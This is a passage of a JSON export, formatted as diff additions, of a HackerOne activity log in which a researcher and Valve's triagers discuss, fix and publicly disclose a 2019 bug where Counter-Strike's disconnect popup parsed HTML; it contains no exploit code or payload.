JqcdWdwy6yMeRcmWXvrr50l3xmx4ZVenDU%2FJtgoI%2BVznl1w5kWpZyrrryWGATyEfw47VeINLtjJXQiBm%2FtsdJKR%2FUNyu1wxs4SPRLdf%2Fje9wnFOdNjAzD4n7qoBjqxAclBXSZX5G1EGG0VOqTUzC21u2MNyu51phI1ys1%2B6uIP3wgenMeIXpBmciTImpA3aFP4ng9cLZGSnZTRsU0zXZxH4%2FyvKBheT7YuS%2F6dlvGllnxjsRJpJSxFtvt%2BwQMln5HVRmPnEIWXGkSOdOWIYAiRkfYoHWEIfPVniUKAcjpGHmd44L06V2hWu2jHKJz33sdHWQxZVh5RDQ0uL0bYoUosxbzl%2BjgtMDeHkZmRLFwM3Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=11200dc32a3363e0bd66b4130350181ecc4ba184ab1d676f6a8ff1f59f7a9288"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5248280,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@shayhelman \n\nThanks for the added info. I'll escalate this to Valve's team and we will get back to you as soon as there are any updates.",
+      "automated_response": false,
+      "created_at": "2019-07-03T21:54:16.048Z",
+      "updated_at": "2019-07-03T21:54:16.048Z",
+      "actor": {
+        "username": "h1_analyst_everton",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_everton",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/166/997/bf60ed9bb749786ae3f68f25703bf0528699cda7_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5358484,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Any updates on this issue? Also, will this report be marked as triaged?",
+      "automated_response": false,
+      "created_at": "2019-07-18T14:31:37.638Z",
+      "updated_at": "2019-07-18T14:33:27.470Z",
+      "actor": {
+        "username": "shayhelman",
+        "cleared": false,
+        "verified": false,
+        "url": "/shayhelman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/S5BZv1rHnPFQcZTvAdbGotZt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5423115,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Just to clarify, this report has been triaged correct? If so, will the status be changed as such?\n\nThank you,\nshay",
+      "automated_response": false,
+      "created_at": "2019-07-25T02:22:09.598Z",
+      "updated_at": "2019-07-25T02:22:09.598Z",
+      "actor": {
+        "username": "shayhelman",
+        "cleared": false,
+        "verified": false,
+        "url": "/shayhelman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/S5BZv1rHnPFQcZTvAdbGotZt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5482648,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @shayhelman,\nThe report is still under review by the internal team and has not been confirmed as valid yet. As soon as we can provide you with those updates we will let you know. Thank you for you patience on this.\n@sodacan",
+      "automated_response": false,
+      "created_at": "2019-08-01T20:35:35.830Z",
+      "updated_at": "2019-08-01T20:35:35.830Z",
+      "actor": {
+        "username": "h1_analyst_ava",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_ava",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/l6jvtw54r3s4hzqzp58kpmfycpjm/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5686991,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello,\n\nAny updates? I've noticed that this issue has been resolved in a recent update [here](https://blog.counter-strike.net/index.php/2019/08/25353/) but no response on this report.\n\nThanks,\nshay",
+      "automated_response": false,
+      "created_at": "2019-08-29T00:45:40.348Z",
+      "updated_at": "2019-08-29T00:45:40.348Z",
+      "actor": {
+        "username": "shayhelman",
+        "cleared": false,
+        "verified": false,
+        "url": "/shayhelman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/S5BZv1rHnPFQcZTvAdbGotZt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5732982,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-09-04T23:11:53.101Z",
+      "updated_at": "2019-09-04T23:11:53.101Z",
+      "actor": {
+        "url": "/valve",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Valve"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "valve",
+      "collaborator": {
+        "username": "shayhelman",
+        "url": "/shayhelman"
+      }
+    },
+    {
+      "id": 5732988,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi shayhelman,\n\nThanks for the report! We have deployed a fix to our production systems. Please let us know if you are still able to reproduce the issue.",
+      "automated_response": false,
+      "created_at": "2019-09-04T23:12:44.985Z",
+      "updated_at": "2019-09-04T23:12:44.985Z",
+      "actor": {
+        "username": "percybysshe",
+        "cleared": false,
+        "verified": false,
+        "url": "/percybysshe",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/vuZfWG7XewsudrWa6NCkyxkZ/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "shayhelman",
+        "url": "/shayhelman"
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5733043,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Thank you very much I can no longer reproduce, the whole disconnect popup no longer parses HTML, is it okay to disclose?",
+      "automated_response": false,
+      "created_at": "2019-09-04T23:27:09.684Z",
+      "updated_at": "2019-09-04T23:27:09.684Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "shayhelman",
+        "cleared": false,
+        "verified": false,
+        "url": "/shayhelman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/S5BZv1rHnPFQcZTvAdbGotZt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5989572,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi, sorry for the late response on your disclosure request. If you use the h1 'request disclosure' feature you might get faster response on those than you get by leaving a comment.\n\nAfter we ship a mitigation, we generally favor disclosing bugs. Just let us know if you have a timing request for disclosure or if we should just click the disclose button.",
+      "automated_response": false,
+      "created_at": "2019-10-08T20:23:14.648Z",
+      "updated_at": "2019-10-08T20:23:14.648Z",
+      "actor": {
+        "username": "percybysshe",
+        "cleared": false,
+        "verified": false,
+        "url": "/percybysshe",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/vuZfWG7XewsudrWa6NCkyxkZ/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5989985,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hmm that's weird, on my end it shows as `shayhelman requested to disclose this report.` for the last comment I sent. The current option for this report is to cancel the disclosure request. Should I cancel and re-request the disclosure?",
+      "automated_response": false,
+      "created_at": "2019-10-08T21:43:25.903Z",
+      "updated_at": "2019-10-08T21:51:25.514Z",
+      "actor": {
+        "username": "shayhelman",
+        "cleared": false,
+        "verified": false,
+        "url": "/shayhelman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/S5BZv1rHnPFQcZTvAdbGotZt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5990052,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Oh whoops, you're totally right. That's an error on my part, I must have been looking at the wrong browser tab or something. In that case, apologies for sitting on it for so long.\n\nJust let us know if you have any timing restrictions and we'll disclose.",
+      "automated_response": false,
+      "created_at": "2019-10-08T22:00:09.742Z",
+      "updated_at": "2019-10-08T22:00:09.742Z",
+      "actor": {
+        "username": "percybysshe",
+        "cleared": false,
+        "verified": false,
+        "url": "/percybysshe",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/vuZfWG7XewsudrWa6NCkyxkZ/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5990060,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I am fine if you disclose right now, thanks.",
+      "automated_response": false,
+      "created_at": "2019-10-08T22:01:43.690Z",
+      "updated_at": "2019-10-08T22:01:43.690Z",
+      "actor": {
+        "username": "shayhelman",
+        "cleared": false,
+        "verified": false,
+        "url": "/shayhelman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/S5BZv1rHnPFQcZTvAdbGotZt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5990103,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Thanks again from Valve security.",
+      "automated_response": false,
+      "created_at": "2019-10-08T22:10:26.312Z",
+      "updated_at": "2019-10-08T22:10:26.312Z",
+      "actor": {
+        "username": "percybysshe",
+        "cleared": false,
+        "verified": false,
+        "url": "/percybysshe",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/vuZfWG7XewsudrWa6NCkyxkZ/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    },
+    {
+      "id": 5990104,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-10-08T22:10:26.425Z",
+      "updated_at": "2019-10-08T22:10:26.425Z",
+      "actor": {
+        "username": "percybysshe",
+        "cleared": false,
+        "verified": false,
+        "url": "/percybysshe",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/vuZfWG7XewsudrWa6NCkyxkZ/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "valve"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
